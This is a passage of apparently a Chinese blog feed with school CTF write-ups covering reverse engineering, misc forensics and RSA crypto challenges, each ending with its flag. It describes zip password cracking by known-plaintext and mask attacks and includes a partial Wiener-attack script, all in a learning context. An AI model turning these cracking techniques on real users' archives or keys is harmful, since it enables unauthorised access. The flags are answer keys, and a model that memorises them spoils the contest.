src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/LLk9bx2aCoVOAYxsYeTc5Yj8nhg.png"></p><p>脱壳</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/MbKpbVEK9oUpSvxqmrqcmCsZnph.png"></p><p>脱壳完成后，拖进 ida 中</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/WV2IbJhCRoeXp5xZBgDcwDFPnse.png"></p><p>看到有一处标红，可能是花指令</p><p>把它 nop 掉</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/DjrJbR9gKo1OHuxAnSccsmGvnyd.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/HTuYb8nF6oqfyax2fQucC5bKnOh.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Dakmbxjo2o8ii6xC7Thcyv79nGg.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/BZWMbMNB2o2N5mxgXoGcOs3Bn9e.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/Xe96bDJ9moLLFYxGRGBcr7YFnic.png"></p><p>找到 地图</p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/CpVSbmH9woXH2UxRXV8c1Jrknsf.png"></p><p><img src="/images/week1-re-%E6%A0%A1%E8%B5%9Bwp.assets/RAarbU1qhooxL2x0J4icrSu6n5e.png"></p><p>得到 flag <code>QLNU&#123;ssaaasaassdddw&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week1-web-校赛wp</title>
      <link href="/2025/05/06/week1-web-%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2025/05/06/week1-web-%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="week1-校赛复现"><a href="#week1-校赛复现" class="headerlink" title="week1-校赛复现"></a>week1-校赛复现</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="baby-misc"><a href="#baby-misc" class="headerlink" title="baby_misc"></a>baby_misc</h2><p>下载压缩包打开后，其中还有一个压缩文件和一个 mp3 格式文件，其中的压缩文件是加密的，如下：</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/M8BVbsZtuolrN1xfdPfcrlO6nRh.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Kd2GbYE0tofy22xjrE9cHjY6nkf.png"></p><p>所以我们要找到这个文件的密码，由题目中的提示，如下：</p><p>可知 mp3 音频的密码是 1111，解决音频后可能得到压缩包的密码</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/CaXBbfgW2ocQHOxPDNUc0FHfndc.png"></p><p>对于如何在 MP3stego 中执行解码命令</p><p><code>decode -X -P 密码 输入.mp3</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/BfnFbbIFqoxDArxiAzhcpASznQc.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/RUGibCuYYo7dbqxVQuJclR5Gn8f.png"></p><p>打开后发现是压缩包，将其复制进入 010，并保存</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/P130b3ZUZobGKNxdliMcrT2tnGZ.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/OxOabaiWYouyjTxElxicJjEBnNc.png"></p><p>保存成压缩包形式打开后</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/XSW5btrAAoGToQx71oAc1nwVnKh.png"></p><p>发现每一个文本中都有循环冗余，原始大小都为 6 字节</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/F53lb2rZFoua8ex6W5BcOeQ9nZd.png"></p><p>依次暴破</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/NohrbmTf7oaf26xYbnTcCc9OnYe.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/ZA9SbyOKFoi6r7x9p5dcXvGLncK.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/GI1qbDdkcoY1ywxpI5PcMrK6nA4.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/PHnWbTLvCoiuTVxoSgOcxnS2ngc.png"></p><p>找到了压缩文件密码，如下：</p><p><strong>oh_you_are_9ood_at_CRC32</strong></p><p>解压完成后打开，内容如下：</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/JKW8bRlnJoIm1GxnujgccfVPn4b.png"></p><p>看他的文件头，就可以发现这是一个 gif 动图，将其复制进 010 中并保存</p><p>重新打开后就可以看到转瞬即逝的 flag，利用 stegsolve 分析</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/GwMkby4Okoxwg2xdbE3cYhe3nJg.png"></p><p>选择 Frame Browser 对动图进行逐帧分析</p><p>得到</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/W9AVbHdYUo0ByMxMN9fcsJNHnTc.png"></p><p><code>QLNU&#123;L1st3n_bE4ut1ful_5ong&#125;</code></p><h2 id="Ez-QR"><a href="#Ez-QR" class="headerlink" title="Ez_QR"></a>Ez_QR</h2><p>下载并解压附件后是 50 个二维码</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/HzWpbn1RJoIpvkxbzCIcFFtIn7e.png"></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>依次扫描 ，组合，就得到 flag</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>利用 python 脚本来解决，但是我这个脚本有些许复杂，它只能出来单个的，并且是乱序，需要自己进行排序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import glob</span><br><span class="line">import zxing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_qr_code(image_path):</span><br><span class="line">    _&quot;&quot;&quot; 读取二维码图片并解析其内容 &quot;&quot;&quot;_</span><br><span class="line">_    _reader = zxing.BarCodeReader()</span><br><span class="line">    barcode = reader.decode(image_path)</span><br><span class="line">    return barcode.raw if barcode else None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def extract_flag_from_folder(folder_path):</span><br><span class="line">    _&quot;&quot;&quot; 扫描文件夹中的所有二维码图片并分别显示解析内容 &quot;&quot;&quot;_</span><br><span class="line">_    _qr_files = glob.glob(os.path.join(folder_path, &quot;*.png&quot;)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, &quot;*.jpg&quot;)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, &quot;*.jpeg&quot;))</span><br><span class="line"></span><br><span class="line">    if not qr_files:</span><br><span class="line">        print(&quot;未找到二维码图片&quot;)</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">    flag_parts = []</span><br><span class="line">    for file in sorted(qr_files):  # 按文件名排序，确保顺序正确</span><br><span class="line">        content = read_qr_code(file)</span><br><span class="line">        if content:</span><br><span class="line">            print(f&quot;文件: &#123;os.path.basename(file)&#125; -&gt; 内容: &#123;content&#125;&quot;)</span><br><span class="line">            flag_parts.append(content)</span><br><span class="line"></span><br><span class="line">    flag = &#x27;&#x27;.join(flag_parts)</span><br><span class="line">    print(&quot;\n完整 Flag:&quot;, flag)</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    folder_path = r&quot;D:\第二次校赛\attachment_QR&quot;  # 你的二维码图片文件夹路径</span><br><span class="line">    if not os.path.exists(folder_path):</span><br><span class="line">        print(&quot;文件夹不存在，请检查路径是否正确！&quot;)</span><br><span class="line">    else:</span><br><span class="line">        extract_flag_from_folder(folder_path)</span><br></pre></td></tr></table></figure><p>他的输出结果就是下面这样</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/EfgGb2xB4oSEydx7L0Ucsx6EnZg.png"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>利用网站批量扫描<br><a href="https://cli.im/deqr/other">https://cli.im/deqr/other</a></p><h2 id="你是-mvp-还是躺赢狗？"><a href="#你是-mvp-还是躺赢狗？" class="headerlink" title="你是 mvp 还是躺赢狗？"></a>你是 mvp 还是躺赢狗？</h2><p>打开附件后是下面的这样的一张图</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/NbXHbJOYYoZEpux2vNrcHKLTnTc.png"></p><p>将其拖进 010，看看有没有隐藏的东西</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Wmt0b4tiBoTPvHxSXbkcmABMnyh.png"></p><p>在 010 中可以看出有另外一个压缩包，复制后在 010 中新建一个文件，并保存</p><p>打开后 ，是这样的一幅图</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/JsAXbXW4CoC1ddxZAE9cqSBKndg.png"></p><p>很显然，图片的高度被切割了</p><p>可以在 010 中修改图片的高度，像下面橘色区域的位置，我这是已经修改好的</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Pe9wbvMzBoTjZHx0FsVc52GRnpd.png"></p><p>保存后，重新打开这张图片就能看到被隐藏的 flag</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/F9NybhlLRoOfB8xIPZOcVTlpnvb.png"></p><p><code>QLNU&#123;l00k_1n_My_3ye5_!&#125;</code></p><h2 id="奇怪的动图"><a href="#奇怪的动图" class="headerlink" title="奇怪的动图"></a>奇怪的动图</h2><p>根据提示，这道题目利用明文攻击</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/LK39bJUm5ogxt5xjLgucd5kZnaf.png"></p><p>压缩 orgin.gif 成 zip 文件</p><p>利用 ARCHPR 工具进行明文攻击</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/SVIRb6RkloE7hhxVfoucurK7nvc.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/ADX6bwICGoKSKOxKLOVc8U6mnvd.png"></p><p>我们根据 wp 中已知：flag 的二进制数列转换成不同大小的帧间隔（因为 gif 非常的卡）</p><p>利用 puzzlesolve 提取帧间隔</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Y7Y4bHZLAopY1hxQfstcjeyJnob.png"></p><p>利用赛博厨子</p><p>将 30 改 0，130 改 1，如下：</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Nvw9b41sfofmMQxbmtNc6VCUnAb.png"></p><p><code>0100000000110001010001100101111101101001001101010101111101100001011011010100000001111010001100010110111000111001</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/JqPbbEmwvoyOEyx64z9ckbgIn8O.png"></p><p>得到 flag：<code>QLNU&#123;@1F_i5_am@z1n9&#125;</code></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开后说 flag 为 UUxOVXtxMW51X3l5ZDUhfQ&#x3D;&#x3D;</p><p>利用赛博厨子进行转换，最终得到</p><p><code>QLNU&#123;q1nu_yyd5!&#125;</code></p><h2 id="生日的祝福"><a href="#生日的祝福" class="headerlink" title="生日的祝福"></a>生日的祝福</h2><p>从祝福信中</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/J8OUbvK6PoAR8CxUUttcJFFnnYe.png"></p><p>得到密码的形式，及使用 binwalk 工具</p><p>另外我们还有一个不知格式的生日礼物</p><p>我们看看它的十六进制，看看有什么隐藏的线索</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/L3OZbHtaQo3hBmxwPLUcMZGanCa.png"></p><p>新建一个文件，将下面的十六进制文本复制，如下：</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Olh1bQfRboVIbnxxhEtcdudgnMe.png"></p><p>保存成 zip 文件</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/P0OibrPOIo8c7FxI2JQcA4NFnJt.png"></p><p>这个时候要找到压缩文件的密钥，也就是从生日祝福中得到的线索</p><p>这个时候利用我们已知的信息进行掩码攻击</p><p>格式：<code>??-18??-??-14</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/IMO4b4HCUoA7QxxLkMlcxCxxnPf.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/JIVHbHwCYonUYcx4WRIcc7Srn4e.png"></p><p>得到密码为 <code>xy-1845-11-14</code></p><p>放进赛博厨子，进行了 16 次不换表 base64 解密，即偏移量为 16</p><p>打开后看到</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Tf2CbOZjKoI9pTxJWKAc5olMnLh.png"></p><p>我们在另外一个文件中看到</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/NNmBb6lEuoRS3MxL4bwc0p9vnyb.png"></p><p>给他进行凯撒解码，得到</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/TAyVbVdUMoyDx6xixRfceGqNnuc.png"></p><p>这样就得到新表为：<code>ABCDEFGabcdefghijklmnopqrstuvwxyzHIJKLMNOPQRST0123456789+/UVWXYZ</code></p><p>再进行 base64 解码，4 次，得到 flag</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/EwD3bR3DCo7cUCxZWgRcKdDtnLe.png"></p><p><code>QLNU&#123;Y0u_@r4_gO0d_Ctfer!&#125;</code></p><h2 id="NetTraffic"><a href="#NetTraffic" class="headerlink" title="NetTraffic"></a>NetTraffic</h2><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/G2kPbHj2LoV0yxxDKXncC9KVnPd.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/GU0BbnsdTo0CL3xkqHfcb2vKnBc.png"></p><p><code>e45e329feb5d925b</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/DnHIbwwy3osWmpxKIIacF1bWnwf.png"></p><p><code>mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7iPM15/igg+WdSX6rY+JBrmtNQgtQXXmACCBBgYmo3UC3C0ttYlk6fo7cEZ4KL2ywLgZlrAte/3VIAP80dXyUz/tEWGpwURP8oXl3z7kUkzk1oWz3A7q76gXiDzi0WuWNBNNOd/IKpT3XrRVblJ3yMo0N8Frw9kmCkJpK8gnIKag==</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/ACf5bfz2JoDxmOxThubcHYAUn6b.png"></p><p>继续往下找</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/BxpdbKOsPoXDXgxiteLcpgYWn3g.png"></p><p><code>mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j6FRdeJTeKrveUGDa4E0d7ntz2dsvDXhVWBK0RRSwrdm5Puy5yjoJ/kEwBRPs7RVZed8+l7HBOmx/mDvLCbKp8V</code></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/IcOWbgr28oBS3axCwvRcZjpPnIf.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/TzD1blQtsoeZ73xzVwHcLEQjnHd.png"></p><p>获得 flag：<code>QLNU&#123;b3h1NdEr_WebShEll_A_L1ttle_hArd&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span></span><br><span class="line"></span><br><span class="line">q= <span class="number">131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span></span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span></span><br><span class="line"></span><br><span class="line">求明文m</span><br></pre></td></tr></table></figure><p>利用脚本来解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import inverse</span><br><span class="line"></span><br><span class="line"># 给定的参数</span><br><span class="line">p = 90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span><br><span class="line">q = 131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span><br><span class="line">e = 65537</span><br><span class="line">c = 10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span><br><span class="line"></span><br><span class="line"># 计算 n 和 φ(n)</span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"># 计算 d = e^(-1) mod φ(n)</span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"># 解密过程：m = c^d mod n</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line"># 将明文从数字转换为字符串（假设明文是ASCII编码）</span><br><span class="line">m_hex = hex(m)[2:]  # 将明文转换为十六进制字符串</span><br><span class="line">m_bytes = bytes.fromhex(m_hex)  # 将十六进制字符串转换为字节</span><br><span class="line">m_text = m_bytes.decode(&#x27;utf-8&#x27;)  # 将字节解码为字符串</span><br><span class="line"></span><br><span class="line">print(&quot;明文 m:&quot;, m_text)</span><br></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;9f873f1c0315202caf47572a0bc24715&#125;</span><br></pre></td></tr></table></figure><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>先看提示：e 很大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import hashlib</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">d = getPrime(256)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = gmpy2.invert(d, (p**2 - 1) * (q**2 - 1))</span><br><span class="line">flag = &quot;QLNU&#123;&quot; + hashlib.md5(str(p + q).encode()).hexdigest() + &quot;&#125;&quot;</span><br><span class="line">p_q=p*q</span><br><span class="line">print(&quot;e=\n&quot;,e)</span><br><span class="line">print(&quot;p_q=&quot;,p_q)</span><br><span class="line"></span><br><span class="line">#e= 11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span><br><span class="line">#p_q= 130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span><br></pre></td></tr></table></figure><p>找脚本来解决这个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    &quot;&quot;&quot;计算连分数</span><br><span class="line">    :param x: 分子</span><br><span class="line">    :param y: 分母</span><br><span class="line">    :return: 连分数列表</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cf = []</span><br><span class="line">    while y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cf</span><br><span class="line">def gradualFra(cf):</span><br><span class="line">    &quot;&quot;&quot;计算传入列表最后的渐进分数</span><br><span class="line">    :param cf: 连分数列表</span><br><span class="line">    :return: 该列表最后的渐近分数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in cf[::-1]:</span><br><span class="line">        # 这里的渐进分数分子分母要分开</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return numerator, denominator</span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    &quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span><br><span class="line">    :param a:x^2的系数</span><br><span class="line">    :param b:x的系数</span><br><span class="line">    :param c:pq</span><br><span class="line">    :return:p，q</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) // (2 * a), (-b - par) // (2 * a)</span><br><span class="line">def getGradualFra(cf):</span><br><span class="line">    &quot;&quot;&quot;计算列表所有的渐近分数</span><br><span class="line">    :param cf: 连分数列表</span><br><span class="line">    :return: 该列表所有的渐近分数</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gf = []</span><br><span class="line">    for i in range(1, len(cf) + 1):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    return gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param e:</span><br><span class="line">    :param n:</span><br><span class="line">    :return: 私钥d</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    for d, k in gf:</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0:</span><br><span class="line">            continue</span><br><span class="line">        phi = (e * d - 1) // k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=11881209201971769960545703420363113088458113193917302081488139824023488466450534979302732775384261289951663819889383871283393435874567676058308730840994269996270426872346181095147425555870816458739259424057593858926773175930567718921307007595412152051860198768425341047243910648792204871486820556061229776758481253766707460244191508467315608593552402934008546939260075670480877521747770290966713971305116824304584455834311003344575523703742396038296944940442595094190044721224502492997055499840877943626918705332507414838517447739584296497147630049609284613069010147083669015648970926768008012325363050285133655831209</span><br><span class="line">n=130506917901757833500880656818230820111814896821558809911665070609238340634103350641776200339447972610494005145107335910027066209703279478749621714942522771203012251624129809835281668541767719703766910930322436841293254585077622914048546318552348193600182349920340961207838400472237841419251522129796103603763</span><br><span class="line">d=wienerAttack(e, n**2)</span><br><span class="line">k = e * d - 1</span><br><span class="line"></span><br><span class="line">r = k</span><br><span class="line">t = 0</span><br><span class="line">while True:</span><br><span class="line">    r = r // 2</span><br><span class="line">    t += 1</span><br><span class="line">    if r % 2 == 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">success = False</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    g = random.randint(0, n)</span><br><span class="line">    y = pow(g, r, n)</span><br><span class="line">    if y == 1 or y == n - 1:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    for j in range(1, t):</span><br><span class="line">        x = pow(y, 2, 